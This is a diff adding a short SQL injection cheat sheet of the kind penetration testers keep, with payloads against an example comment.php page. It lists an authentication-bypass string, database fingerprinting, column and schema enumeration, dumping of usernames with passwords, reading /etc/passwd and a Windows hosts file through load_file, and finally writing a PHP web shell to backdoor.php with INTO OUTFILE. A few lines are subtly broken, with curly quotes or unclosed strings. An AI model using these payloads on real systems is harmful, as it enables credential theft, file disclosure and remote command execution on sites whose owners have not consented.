@@ -1,0 +1,43 @@
+## Try an elict errors
+'
+;
+--
+/*
+*/
+#
+
+## look at html/js source
+## review application code if available
+
+wronguser' or 1=1 LIMIT 1;#
+id=10 AND 1=2
+id=10 AND 1=1
+
+## Fingerprint db
+SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1
+MySql: ‘test’ + ‘ing’
+SQL Server: ‘test’ ‘ing’
+Oracle: ‘test’||’ing’
+PostgreSQL: ‘test’||’ing’
+
+## Column Enumeration
+comment.php?id=738 order by 1
+comment.php?id=738 order by 2
+comment.php?id=738 order by 3
+comment.php?id=738 order by 4
+comment.php?id=738 order by 5
+comment.php?id=738 order by 6
+comment.php?id=738 order by 7 --error
+
+## Database Enumeration
+comment.php?id=738 union all select 1,2,3,4,5,6
+comment.php?id=738 union all select 1,2,3,4,@@version,6
+comment.php?id=738 union all select 1,2,3,4,user(),6
+comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
+comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
+
+## Database attacks
+comment.php?id=738 union select 1,2,3,4,load_file('C:/windows/system32/drivers/etc/hosts),6 FROM users
+comment.php?id=738 union select 1,2,3,4,load_file('/etc/passwd),6 FROM users
+comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
